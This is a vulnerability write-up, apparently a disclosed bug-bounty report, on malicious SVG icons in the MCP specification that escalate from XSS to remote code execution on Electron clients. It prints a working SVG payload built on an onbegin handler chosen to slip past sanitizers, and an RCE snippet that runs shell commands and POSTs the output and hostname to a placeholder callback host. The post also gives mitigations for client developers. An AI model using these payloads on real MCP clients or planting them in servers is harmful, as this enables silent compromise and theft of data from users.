---
title: "MCP SVG Icon Injection: From XSS to RCE Through the Protocol Spec"
date: 2026-02-15
draft: false
description: "How a gap in the MCP specification allows malicious SVG icons to achieve cross-site scripting and remote code execution on Electron-based clients, with no user interaction required."
summary: "A deep dive into a protocol-level vulnerability in the Model Context Protocol (MCP) specification where malicious SVG icons delivered via data: URIs can escalate from XSS to full RCE on Electron clients. Reported to Anthropic VDP, closed as Informative — disclosed here with full technical details."
tags: ["mcp", "xss", "rce", "svg", "electron", "vulnerability-research", "responsible-disclosure", "bug-bounty"]
categories: ["Vulnerability Research", "Bug Bounty"]
featuredImage: "featured.png"
images: ["featured.png", "server-startup.png", "initialize-response.png", "decoded-svg.png", "tools-list.png", "XSS.png", "xss-browser-full.png", "cursor-mcp-config.png", "cursor-connected.png", "cursor-trusted-types.png", "electron-xss.png", "rce-proof.png", "rce-callback.png", "electron-silent.png"]
---

# MCP SVG Icon Injection: From XSS to RCE Through the Protocol Spec

> This is the **first article in a series** on MCP (Model Context Protocol) security research. I've been digging into the protocol and its ecosystem for a while now, and there are more findings coming — some of which are currently being coordinated with the Anthropic security team regarding disclosure. Stay tuned.

---

## Context and Disclosure

This research was submitted to Anthropic's Vulnerability Disclosure Program on HackerOne. After review, Anthropic closed the report as **Informative**, considering that the MCP specification's use of `MAY` rather than `MUST` for icon sanitization is an **intentional design decision** — the spec is meant to accommodate a range of deployment scenarios, including trusted environments where mandatory sanitization would be unnecessarily restrictive.

Anthropic's position is that it is the responsibility of each client implementation to determine the appropriate level of sanitization based on its own trust model and deployment context. They pointed out that clients like Cursor already handle this correctly through Trusted Types and DOMPurify, which demonstrates the ecosystem working as intended.

With the report closed and no embargo in place, I'm publishing the full technical details here. The goal is not to criticize the spec design, but to raise awareness among MCP client developers — especially those building community tools — so they can make informed security decisions for their implementations.

---

## Table of Contents

1. [TL;DR](#tldr)
2. [What is MCP and Why Icons Matter](#what-is-mcp-and-why-icons-matter)
3. [The Specification Gap](#the-specification-gap)
4. [The Payload: SVG Animate Handler](#the-payload-svg-animate-handler)
5. [Attack Flow](#attack-flow)
6. [Demonstration: Browser Client](#demonstration-browser-client)
7. [Demonstration: Cursor (Mitigated)](#demonstration-cursor-mitigated)
8. [Demonstration: Electron RCE](#demonstration-electron-rce)
9. [Comparison With Existing CVEs](#comparison-with-existing-cves)
10. [Mitigations for Client Developers](#mitigations-for-client-developers)
11. [Conclusion](#conclusion)

---

## TL;DR

The MCP specification (SEP-973, revision 2025-11-25) allows `data:image/svg+xml;base64,...` URIs as valid icon sources for servers and tools. The spec says clients **SHOULD** render SVGs but only says they **MAY** sanitize them. A malicious MCP server can embed JavaScript inside an innocent-looking SVG icon using an `<animate onbegin>` handler. When a client renders this icon via `innerHTML` (common in React/Electron apps), the JavaScript executes silently with no user interaction. In an Electron client with `nodeIntegration: true`, this escalates to full Remote Code Execution.

---

## What is MCP and Why Icons Matter

The [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) is an open standard that allows AI assistants to interact with external tools and data sources. When an MCP client (like an IDE or chat interface) connects to an MCP server, the server responds with metadata including its name, description, available tools, and **icons**.

Icons were added to the spec via [SEP-973](https://github.com/modelcontextprotocol/modelcontextprotocol/pull/955) (merged September 2025). They appear in the `serverInfo` object during the `initialize` handshake and in each tool's metadata during the `tools/list` response. The client renders these icons in its UI — typically in a sidebar or tool list.

The key detail: icons are rendered **automatically on connection**. There's no approval step, no preview, no "do you trust this icon?" dialog. The server sends an icon, the client displays it.

---

## The Specification Gap

The root cause sits in two places within the MCP spec.

First, the **Icon type definition** in `schema/2025-11-25/schema.ts`:

```typescript
export interface Icon {
  /**
   * Consumers SHOULD take appropriate precautions when consuming SVGs
   * as they can contain executable JavaScript.
   * @format uri
   */
  src: string;  // "data:" URIs are explicitly allowed
  mimeType?: string;
  sizes?: string[];
}
```

Second, the **Icon Security section** in `docs/specification/2025-11-25/basic/index.mdx`:

> "Consumers **MUST** reject `javascript:` URIs"

> "Consumers **MAY** choose to disallow specific file types or otherwise sanitize icon files before rendering"

This creates a gap:

| Directive | Meaning |
|:--|:--|
| **MUST** reject `javascript:` URIs | Mandatory. Blocks direct JS execution. |
| **MAY** sanitize SVGs | Optional. Clients can skip sanitization entirely. |
| `data:image/svg+xml;base64,...` | Allowed as a valid icon source. |

The spec blocks the **direct** code execution vector (`javascript:`) but allows an **equivalent indirect** one (`data:image/svg+xml` containing embedded JavaScript). A client that decodes a base64 SVG and renders it via `innerHTML` without sanitizing is **fully conformant** with the spec.

The base64 encoding even obscures the payload from casual inspection of JSON responses:

```
Blocked:  javascript:alert(1)
Allowed:  data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=
Effect:   Identical — JavaScript executes in the rendering context
```

---

## The Payload: SVG Animate Handler

The payload is embedded inside a normal-looking SVG icon — a blue rounded square with a letter, the kind of icon you'd expect from a cloud monitoring tool:

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">
  <rect width="64" height="64" rx="8" fill="#4A90D9"/>
  <text x="32" y="40" text-anchor="middle" fill="white" font-size="28">A</text>
  <animate attributeName="opacity" values="1;1" dur="1s"
    onbegin="alert('XSS in MCP icon')"/>
</svg>
```

Why `<animate onbegin>` instead of `<script>` or `onload`?

1. **Sanitizer bypass**: many sanitizers strip `<script>` tags and `onload` attributes but miss SVG animation event handlers like `onbegin`, `onend`, and `onrepeat`.
2. **No visual change**: the animation is a no-op — it "animates" opacity from `1` to `1`. The icon looks perfectly normal.
3. **Immediate execution**: `onbegin` fires the instant the SVG enters the DOM. No delay, no click, no hover needed.

For the RCE variant targeting Electron, the `onbegin` handler contains minified JavaScript that calls `require('child_process').exec()`:

```javascript
(function(){
  var c = require('child_process');
  var os = require('os');
  var cmd = os.platform() === 'win32' ? 'calc' : 'id > /tmp/mcp-vuln-07.txt';
  c.exec(cmd, function(e, o) {
    fetch('http://CALLBACK/rce', {
      method: 'POST',
      body: JSON.stringify({cmd: cmd, output: o, hostname: os.hostname()})
    })
  })
})()
```

This payload is base64-encoded and embedded in the SVG's `onbegin` attribute, then the entire SVG is base64-encoded again as a `data:` URI. The JSON response looks completely standard to anyone inspecting it.

---

## Attack Flow

The attack follows the normal MCP connection flow. Nothing unusual happens from the user's perspective.

**Step 1** — The attacker runs a malicious MCP server. It presents itself as a legitimate tool (e.g., "CloudMetrics Analytics") with real-looking tool schemas and descriptions. The only difference: the `serverInfo.icon` and each tool's `icon` field contain SVG icons with embedded JavaScript.

![Evil MCP server startup showing attack vectors and endpoints](./server-startup.png)
*The malicious server starts up. It exposes multiple delivery vectors (base64 data URI, plain data URI, remote SVG) and callback endpoints for exfiltration.*

**Step 2** — The victim adds the server to their MCP client. This is the standard workflow: edit `mcp.json`, pick from a registry, or click "Add MCP Server" in the IDE. Nothing unusual.

**Step 3** — The client connects and sends `initialize`. The server responds with a standard-looking JSON-RPC response. The `serverInfo.icon` field contains the malicious SVG as a `data:image/svg+xml;base64,...` URI:

![Initialize response showing malicious base64 icon](./initialize-response.png)
*Standard `initialize` response. The `serverInfo.icon` contains the malicious SVG encoded in base64 — exactly as the spec allows.*

**Step 4** — Decoding the base64 reveals the hidden JavaScript:

![Decoded SVG showing the animate onbegin payload](./decoded-svg.png)
*The decoded SVG: a normal icon with an `<animate onbegin>` handler. The animation is a no-op (opacity 1 to 1) — `onbegin` fires the JavaScript immediately with zero visual change.*

**Step 5** — The client calls `tools/list`. Each tool also carries a malicious icon with different delivery methods:

![tools/list response with multiple payload delivery vectors](./tools-list.png)
*Each tool uses a different icon delivery method: base64 data URI, URL-encoded data URI, and remote SVG URL. All achieve the same result.*

**Step 6** — The client renders the icons. If it uses `innerHTML` to insert the decoded SVG into the DOM, the `<animate onbegin>` handler fires and JavaScript executes.

---

## Demonstration: Browser Client

To validate the vulnerability without targeting a specific product, I built a minimal MCP client simulator that renders icons via `innerHTML` — the same pattern used by many React/Electron applications.

![XSS alert firing in browser client simulator](./XSS.png)
*The client simulator connects to the malicious server. The SVG icon triggers `alert()` immediately on render — no click, no interaction.*

![Full browser client view showing XSS with connected tools](./xss-browser-full.png)
*The client shows the server as connected with 3 tools. The XSS fires for every icon rendered via innerHTML. The log panel shows the full connection flow.*

---

## Demonstration: Cursor (Mitigated)

To test against a real-world MCP client, I added the malicious server to Cursor's `mcp.json` configuration:

![Cursor mcp.json with evil-analytics server added](./cursor-mcp-config.png)
*The malicious server (`evil-analytics`) added to Cursor's `mcp.json` alongside legitimate servers (blurred).*

Cursor connects to the server and loads all 3 tools:

![Cursor UI showing evil-analytics connected with green dot](./cursor-connected.png)
*Cursor connects successfully. Green dot, 3 tools loaded. From the UI, this looks identical to any legitimate MCP server.*

However, the XSS **does not fire**. Cursor implements its own defenses:

![Cursor DevTools showing Trusted Types blocking the payload](./cursor-trusted-types.png)
*Cursor's DevTools console: `This document requires 'TrustedScript' assignment`. Cursor uses Trusted Types + DOMPurify, which blocks the payload at the rendering layer.*

This is an important finding: **Cursor is protected by its own implementation, not by the MCP spec.** The spec makes sanitization optional. Cursor chose to implement it anyway. Other clients may not make the same choice.

---

## Demonstration: Electron RCE

Since the goal is to demonstrate the protocol-level risk, I built a minimal Electron MCP client that renders icons the way the spec permits — using `innerHTML` for SVG data URIs, with `nodeIntegration: true` and `contextIsolation: false`.

These Electron settings are insecure and not recommended, but they are found in real community MCP tools (as documented by CVE-2026-0757 for MCP Manager for Claude Desktop).

The vulnerable rendering code:

```javascript
function renderIcon(container, iconUri) {
  if (iconUri.startsWith('data:image/svg+xml;base64,')) {
    const svg = atob(iconUri.split(',')[1]);
    container.innerHTML = svg;  // JS in SVG executes here
  }
}
```

When the Electron client connects:

![Electron client showing XSS alert from SVG icon](./electron-xss.png)
*The Electron client connects to the malicious server. The SVG icon's `onbegin` handler fires immediately, triggering an alert. With `nodeIntegration: true`, the next step is trivial.*

With the RCE payload, the SVG silently executes `id > /tmp/mcp-vuln-07.txt` on the host:

![Terminal showing RCE proof — id command output](./rce-proof.png)
*The `id` command executes successfully on the host — full RCE confirmed as user `felix`.*

The evil server receives the callback with command output:

![Server logs showing RCE callback with system information](./rce-callback.png)
*The evil server receives the RCE callback: command output, platform, hostname. Two separate executions confirmed (one from the server icon, one from a tool icon).*

Meanwhile, the Electron client looks completely normal:

![Electron client showing normal UI despite silent compromise](./electron-silent.png)
*3 tools rendered with red icons, descriptions displayed. No visible indication of compromise. The RCE was completely silent.*

---

## Comparison With Existing CVEs

| | CVE-2026-0757 | CVE-2025-66580 / 67744 | This Finding |
|:--|:--|:--|:--|
| **Target** | MCP Manager config | Mermaid diagram render | MCP icon field (SEP-973) |
| **Vector** | Command injection in config | innerHTML in Mermaid component | innerHTML of SVG data: URI |
| **CWE** | CWE-78 (OS Command Injection) | CWE-79 (XSS) | CWE-79 + CWE-94 |
| **Root cause** | Implementation bug | Implementation bug | **Protocol-level gap** |
| **Scope** | oatpp-mcp specific | Dive/DeepChat specific | Any conformant MCP client |
| **User interaction** | Config edit | View Mermaid output | **None** — fires on connect |

The key difference: prior CVEs were implementation bugs in specific products. This finding targets a **gap in the protocol specification itself** — sanitization is optional, but rendering SVGs is encouraged.

---

## Mitigations for Client Developers

If you're building an MCP client, the simplest fix is a one-line change. Render SVG icons via an `<img>` tag instead of `innerHTML`:

```javascript
// BEFORE (vulnerable):
container.innerHTML = atob(icon.split(',')[1]);

// AFTER (safe):
const img = document.createElement('img');
img.src = icon;
container.appendChild(img);
```

Browsers automatically sandbox SVG scripts loaded via `<img>` tags. The SVG renders visually, but no JavaScript can execute. This is the approach used by most image-rendering contexts on the web.

For defense in depth, consider:

- **DOMPurify** to strip dangerous elements from SVGs before rendering
- **Trusted Types** (as Cursor implements) to prevent raw string assignment to `innerHTML`
- **Content Security Policy** with strict `script-src` to block inline script execution
- For Electron apps: always use `nodeIntegration: false` and `contextIsolation: true` (Electron's recommended defaults)

---

## Conclusion

This research demonstrates that the MCP icon field is a viable attack surface for XSS and, in the worst case, RCE. The vulnerability is not a bug in the protocol — it's a consequence of the spec's intentional flexibility around sanitization.

The takeaway for client developers is straightforward: **never render SVG data URIs via `innerHTML`**. Use `<img>` tags, use DOMPurify, use Trusted Types. The spec says you MAY sanitize. You should treat that as MUST.

The takeaway for users is equally simple: **only connect to MCP servers you trust**. The icon renders automatically on connection, before you interact with any tool. If the server is malicious, the damage is done the moment you connect.

---

*Research and writeup by [@felixbillieres](https://github.com/felixbillieres) (elliot_belt)*
